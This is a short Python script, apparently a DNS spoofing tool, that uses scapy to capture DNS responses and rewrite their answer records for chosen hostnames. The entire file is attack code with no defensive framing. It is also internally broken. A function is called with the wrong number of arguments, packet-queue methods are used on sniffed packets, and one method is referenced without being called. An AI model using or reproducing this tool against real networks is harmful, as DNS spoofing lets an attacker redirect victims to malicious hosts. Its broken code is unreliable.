import os
import sys
import time
import socket
import argparse
from scapy.all import *
import concurrent.futures
from colorama import init, Fore
from scapy.packet import Packet

dns_hosts = {}

def modify_packet(packet: Packet) -> Packet:
	WHITE   = Fore.WHITE

	qname = packet[DNSQR].qname

	if qname not in dns_hosts:
		print(f'{WHITE}[*] NO MODIFICATION : {qname}')
		return packet

	packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
	packet[DNS].ancount = 1

	del packet[IP].len
	del packet[IP].chksum
	del packet[UDP].len
	del packet[UDP].chksum

	return packet

def process_packet(packet: Packet):
	RED = Fore.RED
	WHITE   = Fore.WHITE

	scapy_packet = IP(packet.get_payload())

	if scapy_packet.haslayer(DNSRR):
		print(f'{WHITE} [*] ORIGINAL PACKET')
		print(scapy_packet.summary())
		try:
			scapy_packet = modify_packet(scapy_packet, dns_hosts)
		except IndexError:
			print(f'{RED} [-] NOT AN UDP PACKET')
		
		print(f'{WHITE} [*] MODIFIED PACKET')
		print(scapy_packet.summary)

		packet.set_payload(bytes(scapy_packet))

	packet.accept()

def main():
	init()

	parser = argparse.ArgumentParser(usage='Usage of scanner: --H <DNS Hosts>')
	parser.add_argument('--H', dest='tgtHosts', type=str, help='specify DNS hosts seperated by comma')
	args = parser.parse_args()
	tgtHosts = str(args.tgtHosts).split(',')

	if (tgtHosts[0] == 'None'):
		print(parser.usage)
		exit(0)

	for tgtHost in tgtHosts:
		dns_hosts[tgtHost] = socket.gethostbyname(tgtHost)

	sniff(filter='udp port 53', prn=process_packet, store=False)

if __name__ == '__main__':
	main()